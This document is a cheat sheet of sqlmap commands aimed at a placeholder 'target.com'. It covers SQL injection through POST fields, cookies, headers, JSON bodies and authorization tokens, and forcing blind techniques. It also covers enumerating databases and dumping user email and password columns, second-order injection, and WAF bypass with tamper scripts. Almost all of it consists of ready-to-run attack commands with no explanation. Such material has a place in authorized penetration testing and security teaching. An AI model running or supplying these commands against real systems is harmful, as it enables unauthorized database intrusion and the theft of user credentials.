====================================================
SQLMAP ADVANCED USAGE – PRECISION TARGETING
====================================================

----------------------------------------------------
POST REQUEST – TARGET SPECIFIC PARAMETER
----------------------------------------------------
sqlmap -u "https://target.com/login.php" \
--data="username=admin&password=test123&csrf=token" \
-p username \
--batch

----------------------------------------------------
POST REQUEST WITH AUTHENTICATED SESSION
----------------------------------------------------
sqlmap -u "https://target.com/dashboard" \
--data="search=test&filter=1" \
--cookie="PHPSESSID=abc123; auth_token=xyz456" \
-p search \
--batch

----------------------------------------------------
SQL INJECTION IN COOKIE PARAMETER
----------------------------------------------------
sqlmap -u "https://target.com/profile" \
--cookie="session=abc123; user_id=42" \
-p user_id \
--batch

----------------------------------------------------
SQL INJECTION IN CUSTOM HEADERS
----------------------------------------------------
sqlmap -u "https://target.com/" \
--headers="X-Forwarded-For: 127.0.0.1" \
-p X-Forwarded-For \
--batch

----------------------------------------------------
USER-AGENT HEADER SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/" \
--headers="User-Agent: Mozilla/5.0" \
-p User-Agent \
--batch

----------------------------------------------------
REFERER HEADER SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/" \
--headers="Referer: https://google.com" \
-p Referer \
--batch

----------------------------------------------------
JSON POST BODY SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/api/update" \
--data='{"email":"test@test.com","role":"user"}' \
--headers="Content-Type: application/json" \
-p role \
--batch

----------------------------------------------------
JWT / AUTHORIZATION HEADER SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/api/data" \
--headers="Authorization: Bearer JWT_TOKEN_HERE" \
--level=5 \
--risk=3 \
--batch

----------------------------------------------------
FORCE TIME-BASED BLIND SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
-p id \
--technique=T \
--time-sec=10 \
--batch

----------------------------------------------------
FORCE BOOLEAN-BASED BLIND SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
-p id \
--technique=B \
--batch

----------------------------------------------------
HIGH PRECISION / LOW NOISE (BUG BOUNTY SAFE)
----------------------------------------------------
sqlmap -u "https://target.com/search" \
--data="q=test" \
-p q \
--level=3 \
--risk=2 \
--threads=1 \
--delay=2 \
--batch

----------------------------------------------------
AUTHENTICATED SQL INJECTION WITH HEADER + COOKIE
----------------------------------------------------
sqlmap -u "https://target.com/orders" \
--data="order_id=1001" \
--cookie="PHPSESSID=abc123" \
--headers="X-Requested-With: XMLHttpRequest" \
-p order_id \
--batch

----------------------------------------------------
DATABASE ENUMERATION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
--dbs \
--batch

----------------------------------------------------
TABLE ENUMERATION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
-D users_db \
--tables \
--batch

----------------------------------------------------
COLUMN ENUMERATION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
-D users_db \
-T users \
--columns \
--batch

----------------------------------------------------
DUMP SPECIFIC COLUMNS ONLY
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
-D users_db \
-T users \
-C email,password \
--dump \
--batch

----------------------------------------------------
SECOND-ORDER SQL INJECTION
----------------------------------------------------
sqlmap -u "https://target.com/profile/update" \
--data="bio=test" \
--second-url="https://target.com/admin/export" \
--batch

----------------------------------------------------
BYPASS BASIC WAF / FILTERS
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
--tamper=space2comment,between \
--batch

----------------------------------------------------
RANDOM USER AGENT + SAFE EXECUTION
----------------------------------------------------
sqlmap -u "https://target.com/item?id=5" \
--random-agent \
--delay=3 \
--threads=1 \
--batch

====================================================
END
====================================================
